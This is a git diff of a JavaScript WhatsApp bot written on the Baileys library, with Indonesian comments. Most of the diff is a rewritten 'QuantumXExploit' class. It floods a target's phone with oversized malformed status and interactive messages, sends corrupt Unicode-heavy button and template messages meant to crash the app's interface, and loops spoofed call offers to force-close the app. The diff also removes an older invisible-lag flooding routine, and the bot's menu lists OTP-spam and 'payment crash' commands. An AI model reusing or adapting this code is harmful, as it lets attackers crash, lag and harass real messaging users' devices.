@@ -111,10 +111,6 @@ const bratLimit = new Map();
 const MAX_BRAT = 2;
 const BRAT_COOLDOWN = 10*  60 * 60 * 1000; 
 
-// ========== BRAT V2 ==========
-const bratV2Limit = new Map();
-const MAX_BRAT_V2 = 2;
-const BRAT_V2_COOLDOWN = 10 * 60 * 60 * 1000; // 10 jam
 
 const bratVidLimit = new Map();
 const MAX_BRATVID = 2; // max pakai bratvid per cooldown
@@ -616,7 +612,7 @@ try {
 }
 
 function simpanMuted() {
-    fs.writeFile('./muted.json', JSON.stringify(mutedUsers, null, 2), err => {
+    fs.writeFile('./data/muted.json', JSON.stringify(mutedUsers, null, 2), err => {
         if (err) console.error("❌ Gagal simpan muted:", err);
     });
 }
@@ -1194,6 +1190,11 @@ async function processVoiceEffect(inputBuffer, effectType, effectName) {
     });
 }
 
+
+function sleep(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
 async function spamCode(sock, from, msg, text, sender) {
 
   // 🔒 Khusus owner (pakai sender dari handler)
@@ -1639,144 +1640,502 @@ async startSpamOTP(targetPhone, count, chatId) {
 }
 
 // Inisialisasi global
-let realSpammer = null;// ==================== QUANTUMX EXPLOIT SYSTEM + VAMPIRE ====================
+let realSpammer = null;
 
-// ==================== QUANTUMX EXPLOIT SYSTEM - FINAL (INVISIBLE BACKGROUND LAG) ====================
+let isAttacking = false;
+let currentMode = null;
+let currentTarget = null;
+let stopRequested = false;
+
+// ==================== QUANTUMX EXPLOIT SYSTEM + VAMPIRE ====================
 class QuantumXExploit {
     constructor(sock) {
         this.sock = sock;
+        this.version = "4.0 - HybridCrash + ForceClose";
+        this.creator = "FajarX";
     }
 
-    // Log simpel
     log(type, msg) {
-        console.log(`[${type.toUpperCase()}] ${msg}`);
+        console.log(`[${type}] ${msg}`);
     }
 
-    // ============== INVISIBLE BACKGROUND LAG ==============
-    async invisibleLag(targetJid, count = 10) {
-        this.log('INVISIBLE', `👻👻👻 INVISIBLE BACKGROUND LAG 👻👻👻`);
-        this.log('INVISIBLE', `Target: ${targetJid.split('@')[0]} | Paket: ${count} | Mode: SILENT LAG`);
-        
-        let success = 0;
-        
-        // 1. INVISIBLE CHARACTERS (GA KELIATAN DI CHAT & NOTIF)
-        const invisibleText = 
-            '\u200B'.repeat(50000) + // Zero-width space
-            '\u2060'.repeat(50000) + // Word joiner
-            '\uFEFF'.repeat(50000) + // Zero-width no-break space
-            '\u200C'.repeat(50000) + // Zero-width non-joiner
-            '\u200D'.repeat(50000) + // Zero-width joiner
-            '\u200E'.repeat(50000) + // Left-to-right mark
-            '\u200F'.repeat(50000);  // Right-to-left mark
-        
-        // 2. TEXT BIASA TAPI DI DALEM INVISIBLE (BUAT BACKGROUND PROCESS)
-        const hiddenPayload = invisibleText + "A".repeat(10000) + invisibleText;
-        
-        // 3. MENTION MASSIVE TAPI GA KELIATAN
-        const mentionPool = Array.from({ length: 10000 }, () => 
-            `1${Math.floor(Math.random() * 999999999)}@s.whatsapp.net`
-        );
-        
-        for (let i = 0; i < count; i++) {
-            try {
-                // MENTION GA KELIATAN
-                const mentioned = mentionPool.slice(0, 3000 + Math.floor(Math.random() * 2000));
-                
-                // 4. KIRIM PESAN TEXT INVISIBLE (GA ADA NOTIF, GA ADA PREVIEW)
-                await this.sock.sendMessage(targetJid, {
-                    text: hiddenPayload.slice(0, 30000) + ` [${i}]`,
+    // ============== CSTATUS FUNCTION (DELAY INVIS) ==============
+    async cStatus(target) {
+        try {
+            let msg = generateWAMessageFromContent(target, {
+                interactiveResponseMessage: {
+                    body: { text: "".repeat(9000), format: "DEFAULT" },
+                    nativeFlowResponseMessage: {
+                        name: "address_message",
+                        paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"H\",\"address\":\"XT\",\"tower_number\":\"X\",\"city\":\"Medan\",\"name\":\"X\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"".repeat(900000)}\"}}`,
+                        version: 3
+                    },
                     contextInfo: {
-                        mentionedJid: mentioned,
-                        forwardingScore: 9999,
+                        mentionedJid: Array.from({ length: 1999 }, (_, z) => `628${z + 72}@s.whatsapp.net`),
                         isForwarded: true,
-                        // EXTERNAL AD REPLY INVISIBLE JUGA
-                        externalAdReply: {
-                            title: invisibleText.slice(0, 1000),
-                            body: invisibleText.slice(0, 1000),
-                            thumbnail: Buffer.alloc(500 * 1024, 'X'), // 500KB TAPI GA KELIATAN
-                            mediaType: 1,
-                            sourceUrl: 'https://' + 'a'.repeat(1000) + '.com'
+                        forwardingScore: 7205,
+                        forwardedNewsletterMessageInfo: {
+                            newsletterJid: "120363402868866359@newsletter",
+                            newsletterName: "DELAY - mampus",
+                            serverMessageId: 1000,
+                            accessibilityText: "idk"
+                        },
+                        statusAttributionType: "RESHARED_FROM_MENTION",
+                        contactVcard: true,
+                        isSampled: true,
+                        dissapearingMode: { initiator: target, initiatedByMe: true },
+                        expiration: Date.now(),
+                    },
+                }
+            }, {});
+
+            await this.sock.relayMessage(target, { groupStatusMessageV2: { message: msg.message } }, { participant: { jid: target } });
+
+            const msg1 = {
+                viewOnceMessage: {
+                    message: {
+                        interactiveResponseMessage: {
+                            body: { text: "X", format: "DEFAULT" },
+                            nativeFlowResponseMessage: {
+                                name: "address_message",
+                                paramsJson: "\x10".repeat(1045000),
+                                version: 3
+                            },
+                            entryPointConversionSource: "call_permission_request"
                         }
                     }
-                });
-                
-                // 5. KIRIM LOCATION INVISIBLE (MAP PREVIEW TAPI GA ADA NOTIF)
-                if (i % 3 === 0) {
-                    await this.sock.sendMessage(targetJid, {
-                        location: {
-                            degreesLatitude: 999999.999999,
-                            degreesLongitude: -999999.999999,
-                            name: invisibleText.slice(0, 5000),
-                            address: invisibleText.slice(0, 5000),
-                            jpegThumbnail: Buffer.alloc(800 * 1024, 'X'), // 800KB TAPI GA KELIATAN
-                            accuracyInMeters: 999999999,
-                            speedInMps: 999999
-                        },
-                        contextInfo: {
-                            mentionedJid: mentioned.slice(0, 1000),
-                            forwardingScore: 9999
-                        }
-                    });
                 }
-                
-                // 6. KIRIM POLL INVISIBLE (PROSES BACKGROUND)
-                if (i % 4 === 0) {
-                    await this.sock.sendMessage(targetJid, {
-                        poll: {
-                            name: invisibleText.slice(0, 5000),
-                            values: Array.from({ length: 200 }, (_, idx) => invisibleText.slice(0, 100) + idx),
-                            selectableCount: 200
-                        },
-                        contextInfo: {
-                            mentionedJid: mentioned.slice(0, 500),
-                            forwardingScore: 9999
-                        }
-                    });
-                }
-                
-                success++;
-                
-                if (success % 5 === 0 || i === count - 1) {
-                    this.log('INVISIBLE', `✓ ${success}/${count} paket silent terkirim`);
-                }
-                
-                // DELAY SEDANG BIAR BACKGROUND PROCESS MENUMPUK
-                if (i < count - 1) {
-                    await new Promise(r => setTimeout(r, 300 + Math.random() * 300));
-                }
-                
-            } catch (err) {
-                this.log('INVISIBLE', `✗ Paket ${i+1} error: ${err.message}`);
+            };
+
+            const msg2 = {
+                ephemeralExpiration: 0,
+                forwardingScore: 9741,
+                isForwarded: true,
+                font: Math.floor(Math.random() * 99999999),
+                background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
+            };
+
+            for (let i = 0; i < 1000; i++) {
+                const payload = generateWAMessageFromContent(target, msg1, msg2);
+                await this.sock.relayMessage(target, { groupStatusMessageV2: { message: payload.message } }, { messageId: payload.key.id, participant: { jid: target } });
                 await new Promise(r => setTimeout(r, 1000));
             }
+
+            await this.sock.relayMessage("status@broadcast", {
+                statusJidList: [target],
+                additionalNodes: [{
+                    tag: "meta",
+                    attrs: {},
+                    content: [{
+                        tag: "mentioned_users",
+                        attrs: {},
+                        content: [{ tag: "to", attrs: { jid: target } }]
+                    }]
+                }]
+            });
+
+            return true;
+        } catch (err) {
+            this.log('CSTATUS', `✗ Error: ${err.message}`);
+            return false;
         }
-        
-        this.log('INVISIBLE', `✅ INVISIBLE LAG SELESAI! Berhasil ${success}/${count} paket silent di background`);
-        return { sent: success, total: count };
     }
 
-    // ============== MODE NORMAL ==============
-    async normalAttack(targetJid, count = 10) {
-        this.log('NORMAL', `👻 Attack dimulai → ${count} INVISIBLE BACKGROUND LAG`);
-        
-        const result = await this.invisibleLag(targetJid, count);
-        
-        this.log('NORMAL', `✅ Selesai → Total berhasil ${result.sent}/${count}`);
-        return { 
-            totalSent: result.sent, 
-            total: count, 
-            invisible: result, 
-            mode: 'invisible_lag' 
-        };
+       // ============== DELAY FUNCTION (PAKAI CSTATUS) ==============
+    async delay(targetJid, count = 10) {
+        isAttacking = true;
+        currentMode = 'delay';
+        currentTarget = targetJid;
+        stopRequested = false;
+
+        this.log('DELAY', `👻 TARGET: ${targetJid.split('@')[0]} | PAKET: ${count} | STATUS: STARTED`);
+        let success = 0;
+
+        for (let i = 0; i < count; i++) {
+            // CEK JIKA ADA REQUEST STOP
+            if (stopRequested) {
+                this.log('DELAY', `🛑 STOP DITERIMA DI BATCH ${i+1}/${count}`);
+                break;
+            }
+
+            try {
+                for (let j = 0; j < 200; j++) {
+                    await this.cStatus(targetJid);
+                    if (j % 20 === 0) await new Promise(r => setTimeout(r, 10));
+
+                    // Cek stop lebih halus di inner loop (opsional, biar lebih responsif)
+                    if (stopRequested) break;
+                }
+                success++;
+                this.log('DELAY', `✓ BATCH ${i+1}/${count} (200x CStatus)`);
+                await new Promise(r => setTimeout(r, 500));
+            } catch (err) {
+                this.log('DELAY', `✗ Error: ${err.message}`);
+            }
+        }
+
+        // Reset flag setelah selesai atau di-stop
+        isAttacking = false;
+        currentMode = null;
+        currentTarget = null;
+        stopRequested = false;
+
+        this.log('DELAY', `✅ SELESAI ATAU DIHENTIKAN! ${success}/${count} batch sukses`);
+        return { sent: success * 200, total: count * 200, stopped: stopRequested };
     }
+    // ============== HYBRID CRASHUI (BLANK1 + TEMPLATE + CRASHUI CORRUPT) ==============
+    async crashUIHybrid(targetJid, count = 10) {
+        this.log('CRASHUI_HYBRID', `💥⚔️ TARGET: ${targetJid.split('@')[0]} | PAKET: ${count} | MODE: HYBRID CRASH`);
+        let totalSuccess = 0;
+
+        for (let i = 0; i < count; i++) {
+            try {
+                this.log('CRASHUI_HYBRID', `🔄 ROUND ${i+1}/${count}: FIRING HYBRID CRASH...`);
+
+                // BLANK1 msg1 (interactiveMessage corrupt)
+                const msgBlank1 = {
+                    viewOnceMessage: {
+                        message: {
+                            interactiveMessage: {
+                                header: {
+                                    title: "BLANK CRASH" + "ꦽ".repeat(5000) + "𑇂𑆵𑆴𑆿".repeat(5000),
+                                    hasMediaAttachment: true,
+                                    locationMessage: {
+                                        degreesLatitude: 999999999,
+                                        degreesLongitude: 999999999,
+                                        name: "BLANK ATTACK" + "ꦽ".repeat(2000),
+                                        address: "BLANK EXPLOIT" + "𑇂𑆵𑆴𑆿".repeat(2000)
+                                    }
+                                },
+                                body: {
+                                    text: "BLANK PAYLOAD" + "𑇂𑆵𑆴𑆿".repeat(5000) + "ꦽ".repeat(5000),
+                                },
+                                nativeFlowMessage: {
+                                    messageParamsJson: "{}",
+                                    buttons: [{
+                                        name: "quick_reply",
+                                        buttonParamsJson: JSON.stringify({ display_text: "BLANK" + "ꦽ".repeat(1000) })
+                                    }]
+                                },
+                                contextInfo: {
+                                    forwardingScore: 9999,
+                                    isForwarded: true,
+                                    businessMessageForwardInfo: { businessOwnerJid: "0@s.whatsapp.net" },
+                                    mentionedJid: Array.from({ length: 1000 }, () => `1${Math.floor(Math.random() * 9999999999)}@s.whatsapp.net`)
+                                }
+                            }
+                        }
+                    }
+                };
+
+                // BLANK1 msg2 (templateButtonReplyMessage corrupt)
+                const msgBlank2 = {
+                    templateButtonReplyMessage: {
+                        templateId: "BLANK TEMPLATE" + "ꦽ".repeat(1000),
+                        replyButtonMessageId: "BLANK1 ID" + "𑇂𑆵𑆴𑆿".repeat(1000),
+                        title: "BLANK" + "ꦽ".repeat(1000) + "💀".repeat(1000),
+                        footer: "BLANK FOOTER" + "🔥".repeat(1000) + "⚡".repeat(1000),
+                        bodyText: "BLANK BODY" + "👻".repeat(3000),
+                        buttons: [
+                            { buttonId: "btn1" + "x".repeat(500), buttonText: { displayText: "🔘 BLANK1 BUTTON 1 🔘" + "ꦽ".repeat(500) } },
+                            { buttonId: "btn2" + "y".repeat(500), buttonText: { displayText: "🔘 BLANK1 BUTTON 2 🔘" + "💀".repeat(500) } }
+                        ],
+                        contextInfo: { forwardingScore: 9999, isForwarded: true }
+                    }
+                };
+
+                // CRASHUI corrupt (payload lo)
+                const msgCrashUI = {
+                    viewOnceMessage: {
+                        message: {
+                            buttonsMessage: {
+                                text: "バルモッズ" + "ꦾ".repeat(99999),
+                                contentText: "バルモッズ" + "ꦾ".repeat(99999),
+                                contextInfo: {
+                                    forwardingScore: 6,
+                                    isForwarded: true,
+                                    remoteJid: "X",
+                                    participant: "0@s.whatsapp.net",
+                                    stanzaId: "1234567890ABCDEF",
+                                    quotedMessage: { paymentInviteMessage: { serviceType: 3, expiryTimestamp: Date.now() + 1814400000 } }
+                                },
+                                headerType: 1
+                            }
+                        }
+                    }
+                };
+
+                // KIRIM 3 PESAN SEKALIGUS
+                await this.sock.relayMessage(targetJid, msgBlank1, {});
+                await this.sock.relayMessage(targetJid, msgBlank2, {});
+                await this.sock.relayMessage(targetJid, msgCrashUI, {});
+
+                totalSuccess += 3;
+                this.log('CRASHUI_HYBRID', `✓ ROUND ${i+1} TERKIRIM (3 PESAN HYBRID)`);
+
+                await new Promise(r => setTimeout(r, 200 + Math.random() * 200)); // delay stabil
+            } catch (err) {
+                this.log('CRASHUI_HYBRID', `✗ Error di round ${i+1}: ${err.message || err}`);
+            }
+        }
+
+        this.log('CRASHUI_HYBRID', `✅ SELESAI HYBRID CRASH! TOTAL PESAN TERKIRIM: ${totalSuccess}`);
+        return { sent: totalSuccess, total: count * 3, mode: 'HYBRID_CRASHUI' };
+    }
+
+ // ============== FORCE CLOSE SPAM CALL (FC MODE) - SUPPORT STOP + FIXED ENCODE ==============
+async forceClose(targetJid, durationSeconds = 60) {
+    this.log('FORCE_CLOSE', `☠️ TARGET: ${targetJid.split('@')[0]} | DURASI: ${durationSeconds} detik | STATUS: STARTED`);
+
+    const { encodeSignedDeviceIdentity, jidDecode } = require("@alannxd/baileys");
+    const crypto = require("crypto");
+
+    let devices = (await this.sock.getUSyncDevices([targetJid], false, false))
+        .map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
+
+    await this.sock.assertSessions(devices);
+
+    let mutexMap = {};
+    const mutex = (key, fn) => {
+        mutexMap[key] = mutexMap[key] || { task: Promise.resolve() };
+        mutexMap[key].task = (async (prev) => {
+            try { await prev; } catch {}
+            return fn();
+        })(mutexMap[key].task);
+        return mutexMap[key].task;
+    };
+
+    // FIXED SAFE ENCODE - Hindari serializeBinary yang ga ada di banyak versi Baileys
+    const safeEncodeMessage = (msg) => {
+        try {
+            // Prioritas 1: pakai encodeWAMessage kalau ada
+            if (this.sock.encodeWAMessage) {
+                return this.sock.encodeWAMessage(msg);
+            }
+
+            // Prioritas 2: pakai toArrayBuffer kalau proto support
+            if (proto && proto.WebMessageInfo) {
+                const webMsg = proto.WebMessageInfo.fromObject(msg);
+                if (webMsg.toArrayBuffer) {
+                    return Buffer.from(webMsg.toArrayBuffer());
+                }
+            }
+
+            // Fallback terakhir: JSON stringify (paling aman, meski ga ideal)
+            this.log('FORCE_CLOSE', `Encode fallback ke JSON (serializeBinary/toArrayBuffer ga ada)`);
+            return Buffer.from(JSON.stringify(msg));
+        } catch (e) {
+            this.log('FORCE_CLOSE', `Encode fallback error: ${e.message || e}`);
+            return Buffer.from("fallback-buffer-safe");
+        }
+    };
+
+    let originalCreateParticipantNodes = this.sock.createParticipantNodes.bind(this.sock);
+
+    this.sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
+        if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };
+
+        let patched = await (this.sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
+        let ywdh = Array.isArray(patched) ? patched : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));
+
+        let { id: meId, lid: meLid } = this.sock.authState.creds.me;
+        let omak = meLid ? jidDecode(meLid)?.user : null;
+        let shouldIncludeDeviceIdentity = false;
+
+        let nodes = await Promise.all(ywdh.map(async ({ recipientJid: jid, message: msg }) => {
+            let { user: targetUser } = jidDecode(jid);
+            let { user: ownPnUser } = jidDecode(meId);
+            let isOwnUser = targetUser === ownPnUser || targetUser === omak;
+            let y = (jid === meId || jid === meLid);
+
+            if (dsmMessage && isOwnUser && !y) msg = dsmMessage;
+
+            let encoded = safeEncodeMessage(msg);
+            let bytes = Buffer.concat([encoded, Buffer.alloc(8, 1)]);
+
+            return mutex(jid, async () => {
+                let { type, ciphertext } = await this.sock.signalRepository.encryptMessage({ jid, data: bytes });
+                if (type === "pkmsg") shouldIncludeDeviceIdentity = true;
+                return {
+                    tag: "to",
+                    attrs: { jid },
+                    content: [{
+                        tag: "enc",
+                        attrs: { v: "2", type, ...extraAttrs },
+                        content: ciphertext
+                    }]
+                };
+            });
+        }));
+
+        return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
+    };
+
+    const startTime = Date.now();
+    let callCount = 0;
+
+    while (Date.now() - startTime < durationSeconds * 1000) {
+        // CEK STOP SETIAP PUTARAN LOOP (ini yang bikin bisa di-stop)
+        if (stopRequested) {
+            this.log('FORCE_CLOSE', `🛑 STOP DITERIMA! Total call spam: ${callCount}`);
+            break;
+        }
+
+        try {
+            const callId = crypto.randomBytes(16).toString("hex").toUpperCase();
+
+            let { nodes: destinations, shouldIncludeDeviceIdentity } = await this.sock.createParticipantNodes(
+                devices,
+                { conversation: "force close test" },
+                { count: "0" }
+            );
+
+            const callOffer = {
+                tag: "call",
+                attrs: {
+                    to: targetJid,
+                    id: this.sock.generateMessageTag(),
+                    from: this.sock.user.id
+                },
+                content: [{
+                    tag: "offer",
+                    attrs: {
+                        "call-id": callId,
+                        "call-creator": this.sock.user.id
+                    },
+                    content: [
+                        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
+                        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
+                        { tag: "video", attrs: { orientation: "0", screen_width: "1920", screen_height: "1080", device_orientation: "0", enc: "vp8", dec: "vp8" } },
+                        { tag: "net", attrs: { medium: "3" } },
+                        { tag: "capability", attrs: { ver: "1" }, content: Buffer.from([1, 5, 247, 9, 228, 250, 1]) },
+                        { tag: "encopt", attrs: { keygen: "2" } },
+                        { tag: "destination", attrs: {}, content: destinations },
+                        ...(shouldIncludeDeviceIdentity ? [{
+                            tag: "device-identity",
+                            attrs: {},
+                            content: encodeSignedDeviceIdentity(this.sock.authState.creds.account, true)
+                        }] : [])
+                    ]
+                }]
+            };
+
+            await this.sock.sendNode(callOffer);
+            callCount++;
+            this.log('FORCE_CLOSE', `📞 Call Offer #${callCount} dikirim`);
+
+            await new Promise(r => setTimeout(r, 800));
+
+            const callTerminate = {
+                tag: "call",
+                attrs: {
+                    to: targetJid,
+                    id: this.sock.generateMessageTag(),
+                    from: this.sock.user.id
+                },
+                content: [{
+                    tag: "terminate",
+                    attrs: {
+                        "call-id": callId,
+                        "reason": "REJECTED",
+                        "call-creator": this.sock.user.id
+                    },
+                    content: []
+                }]
+            };
+
+            await this.sock.sendNode(callTerminate);
+            this.log('FORCE_CLOSE', `🛑 Call #${callCount} diterminate`);
+
+            await new Promise(r => setTimeout(r, 800));
+        } catch (err) {
+            this.log('FORCE_CLOSE', `✗ Error di loop: ${err.message || err}`);
+            await new Promise(r => setTimeout(r, 3000));
+        }
+    }
+
+    this.sock.createParticipantNodes = originalCreateParticipantNodes;
+
+    // RESET FLAG GLOBAL SETELAH SELESAI ATAU DI-STOP
+    isAttacking = false;
+    currentMode = null;
+    currentTarget = null;
+    stopRequested = false;
+
+    this.log('FORCE_CLOSE', `✅ SELESAI ATAU DIHENTIKAN! Total call spam: ${callCount}`);
+    return { sent: callCount, mode: 'FORCE_CLOSE', duration: durationSeconds, stopped: stopRequested };
 }
 
-let exploitSystem = null; // Init di tempat lain: exploitSystem = new QuantumXExploit(sock);
+     // ============== MAIN EXECUTOR (FIX NYANGKUT FLAG) ==============
+async execute(targetJid, mode, count) {
+    // DEBUG: Cek status flag sebelum mulai
+    this.log('EXECUTOR', `STATUS FLAG SEBELUM: isAttacking=${isAttacking}, mode=${currentMode || 'none'}, target=${currentTarget || 'none'}`);
+
+    if (isAttacking) {
+        // Kalau flag nyangkut > 5 menit (contoh), force reset otomatis
+        const stuckThreshold = 5 * 60 * 1000; // 5 menit
+        if (currentTarget && Date.now() - (this.lastAttackStart || 0) > stuckThreshold) {
+            this.log('EXECUTOR', `⚠️ DETEKSI STUCK! Force reset flag setelah ${stuckThreshold/60000} menit`);
+            isAttacking = false;
+            currentMode = null;
+            currentTarget = null;
+            stopRequested = false;
+        } else {
+            this.log('EXECUTOR', `⚠️ SUDAH ADA ATTACK BERJALAN: ${currentMode} ke ${currentTarget.split('@')[0]}`);
+            return { error: 'Attack sudah berjalan, gunakan .bug stop dulu atau tunggu selesai' };
+        }
+    }
+
+    // Set waktu mulai untuk deteksi stuck nanti
+    this.lastAttackStart = Date.now();
+
+    isAttacking = true;
+    currentMode = mode;
+    currentTarget = targetJid;
+    stopRequested = false;
+
+    this.log('EXECUTOR', `🚀 MODE: ${mode} | TARGET: ${targetJid.split('@')[0]} | COUNT: ${count} | STARTED`);
+
+    let result;
+    try {
+        if (mode === 'delay') {
+            result = await this.delay(targetJid, count);
+        } else if (mode === 'crashui') {
+            result = await this.crashUIHybrid(targetJid, count);
+        } else if (mode === 'fc') {
+            result = await this.forceClose(targetJid, count);
+        } else {
+            result = await this.delay(targetJid, count);
+        }
+    } catch (err) {
+        this.log('EXECUTOR', `✗ ERROR DI MODE ${mode}: ${err.message}`);
+        // Force reset kalau error
+        isAttacking = false;
+        currentMode = null;
+        currentTarget = null;
+        stopRequested = false;
+        return { error: err.message };
+    }
+
+    // RESET FLAG PASTI SETELAH SELESAI (normal atau error)
+    isAttacking = false;
+    currentMode = null;
+    currentTarget = null;
+    stopRequested = false;
+    this.lastAttackStart = 0;
+
+    this.log('EXECUTOR', `✅ EXECUTE SELESAI / DIHENTIKAN | FLAG DIRESET`);
+
+    return result;
+}
+}
+let exploitSystem = null;
+
 const userCooldownMap = new Map(); // Map<JID, timestamp>
 
 
 async function startBot() {
-  const { state, saveCreds } = await useMultiFileAuthState('./auth_info_baileys')
+  const { state, saveCreds } = await useMultiFileAuthState('./session')
   const { version, isLatest } = await fetchLatestBaileysVersion()
 
   console.clear()
@@ -1825,7 +2184,7 @@ async function startBot() {
         console.log('🔄 Reconnect dalam 5 detik...')
         setTimeout(startBot, 5000)
       } else {
-        console.log('❌ Logout. Hapus folder auth_info_baileys untuk login ulang.')
+        console.log('❌ Logout. Hapus folder session untuk login ulang.')
       }
     }
   })
@@ -1848,11 +2207,6 @@ async function startBot() {
       console.error(`❌ Gagal kirim ke ${jid}:`, err.message);
     }
   }
-
-
-
-
-
 const commands = [
   // MENU
   '.menu',
@@ -1861,7 +2215,6 @@ const commands = [
   '.btn',
   '.spamotp',
   '.spamcode',
-  '.hitamkan',
   '.hapusbg',
   '.ssweb',
   '.melolo',
@@ -1883,6 +2236,11 @@ const commands = [
   '.panelinfo',
   '.deletepanel',
   '.deleteserver',
+  '.daftar',
+  '.ktp',
+  '.sertiftolol',
+  '.ceknik',
+  '.chat',
 
   // GAME
   '.kuis',
@@ -1918,8 +2276,7 @@ const commands = [
   '.spin',
 
   // AI
-  '.ai',
-  '.aigambar',
+  '.quantumx',
   '.clear',
 
   // MUSIC & DL
@@ -1940,9 +2297,7 @@ const commands = [
   '.toimg',
   '.teks',
   '.brat',
-  '.bratv2',
   '.bratvid',
-  '.bratvidv2',
 
   // MEDIA
   '.waifu',
@@ -2004,6 +2359,7 @@ const commands = [
   '.setlevel',
   '.allskor',
   '.dellskor',
+  '.clearskor',
   '.tantangan',
 
   // VIP CONTROL
@@ -2360,8 +2716,7 @@ if (currentPdfSession) {
         return;
     }
 }
-
-// FUNGSI KHUSUS UNTUK MENU AI DENGAN 2 BUTTON
+// FUNGSI KHUSUS UNTUK MENU AI DENGAN 2 BUTTON (CTA_URL + Developer)
 async function kirimPaketMenuAI(jid, teksTambahan = '', pushName = 'User') {
     const gifs = [
         'https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExMWpkdWZqZnU4am5hcjl0OGJoMXM4N2Eydm9kOXdzODNnanczNnVtdyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/a0Ixcxsv3xBvXl0vj6/giphy.mp4',
@@ -2415,9 +2770,10 @@ ${teksTambahan}
         { upload: sock.waUploadToServer }
     );
 
-    // INTERACTIVE MESSAGE dengan 2 BUTTON QUICK REPLY
+    // INTERACTIVE MESSAGE dengan CTA_URL + QUICK REPLY
     const interactive = proto.Message.InteractiveMessage.create({
         header: proto.Message.InteractiveMessage.Header.create({
+            subtitle: `Halo ${pushName}!`,
             hasMediaAttachment: true,
             ...(media.videoMessage ? { videoMessage: { ...media.videoMessage, gifPlayback: true } } : {})
         }),
@@ -2427,10 +2783,11 @@ ${teksTambahan}
         nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
             buttons: [
                 {
-                    name: "quick_reply",
+                    name: "cta_url",
                     buttonParamsJson: JSON.stringify({ 
                         display_text: "Website", 
-                        id: "ai_website" 
+                        url: "https://aiquantumx.vercel.app",
+                        merchant_url: "https://aiquantumx.vercel.app"
                     })
                 },
                 {
@@ -2514,6 +2871,7 @@ ${teksTambahan}
     // INTERACTIVE MESSAGE dengan BUTTON QUICK REPLY (Developer aja)
     const interactive = proto.Message.InteractiveMessage.create({
         header: proto.Message.InteractiveMessage.Header.create({
+            subtitle: `Halo ${pushName}!`,
             hasMediaAttachment: true,
             ...(media.videoMessage ? { videoMessage: { ...media.videoMessage, gifPlayback: true } } : {})
         }),
@@ -2547,7 +2905,7 @@ ${teksTambahan}
     await sock.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id, quoted: fakeForwarded });
 }
 
-//hanler untuk tombol template button (kontak developer)
+//handler untuk tombol template button (kontak developer)
 if (msg.message?.templateButtonReplyMessage) {
     const selectedId = msg.message.templateButtonReplyMessage.selectedId;
 
@@ -2575,36 +2933,6 @@ END:VCARD`
     quoted: msg 
 });
         return; // stop di sini agar tidak lanjut ke handler lain
-    }
-}
-
-
-
-// HANDLER UNTUK TEMPLATE BUTTON REPLY (AI Website) - DIPISAH!
-if (msg.message?.templateButtonReplyMessage) {
-    const selectedId = msg.message.templateButtonReplyMessage.selectedId;
-
-    console.log('[TEMPLATE BUTTON REPLY AI] User klik:', selectedId);
-
-    if (selectedId === 'ai_website') {
-        await sock.sendMessage(from, {
-            text: `*AI QuantumX*\nhttps://aiquantumx.vercel.app\n`
-        }, { quoted: msg });
-        return;
-    }
-}
-
-// HANDLER UNTUK TEMPLATE BUTTON REPLY (AI Website)
-if (msg.message?.templateButtonReplyMessage) {
-    const selectedId = msg.message.templateButtonReplyMessage.selectedId;
-
-    console.log('[TEMPLATE BUTTON REPLY AI] User klik:', selectedId);
-
-    if (selectedId === 'ai_website') {
-        await sock.sendMessage(from, {
-            text: `🌐 *AI QuantumX*\n🔗 https://aiquantumx.vercel.app\n\nSilakan klik link di atas untuk membuka.`
-        }, { quoted: msg });
-        return;
     }
 }
 
@@ -2649,6 +2977,7 @@ if (msg.message?.interactiveResponseMessage?.nativeFlowResponseMessage) {
 > .cantik
 > .cekiq
 > .cekkhodam
+> .chat
 > .dare
 > .emot
 > .ganteng
@@ -2664,10 +2993,9 @@ if (msg.message?.interactiveResponseMessage?.nativeFlowResponseMessage) {
 
 ▣ AI ASSISTANT
 ══════════════
-> .ai
-> .aigambar
 > .aivideo
 > .clear
+> .quantumx
 
 ▣ MUSIC & DOWNLOADER
 ══════════════
@@ -2684,14 +3012,13 @@ if (msg.message?.interactiveResponseMessage?.nativeFlowResponseMessage) {
 ▣ MAKER / CREATOR
 ══════════════
 > .brat
-> .bratv2
 > .bratvid
-> .bratvidv2
 > .bratwarna
 > .carbon
 > .emojimix
 > .ipchat
 > .qc
+> .sertiftolol
 > .stiker
 > .teks
 > .toimg
@@ -2700,10 +3027,10 @@ if (msg.message?.interactiveResponseMessage?.nativeFlowResponseMessage) {
 ══════════════
 > .ambilpp
 > .blur
+> .ceknik
 > .docx
 > .dwfoto
 > .dwvideo
-> .hitamkan
 > .igstalk
 > .melolo
 > .mirror
@@ -2756,11 +3083,13 @@ if (msg.message?.interactiveResponseMessage?.nativeFlowResponseMessage) {
 > .antitoxic
 > .bebaskan
 > .cekpenjara
+> .clearskor
 > .dellskor
 > .hd
 > .hapusbg
 > .imgtoprompt
 > .kick
+> .ktp
 > .listvip
 > .listskor
 > .mute
@@ -2804,17 +3133,12 @@ if (msg.message?.interactiveResponseMessage?.nativeFlowResponseMessage) {
                 break;
 
             case 'menu_ilegal':
-                teksMenu = font(`┌─ ɪʟʟᴇɢᴀʟ ᴄᴏᴍᴍᴀɴᴅꜱ ─┐
-│
-│  ⚡ .ʙᴜɢ
-│     ᴘᴀʏᴍᴇɴᴛ ᴄʀᴀsʜ - sɪɴɢʟᴇ ᴛᴀʀɢᴇᴛ
-│
-│  🔥 .ꜱᴘᴀᴍᴄᴏᴅᴇ
-│     ᴏᴛᴘ ᴠᴇʀɪꜰɪᴄᴀᴛɪᴏɴ ꜱᴘᴀᴍ
-│
-│  💣 .ꜱᴘᴀᴍᴏᴛᴘ
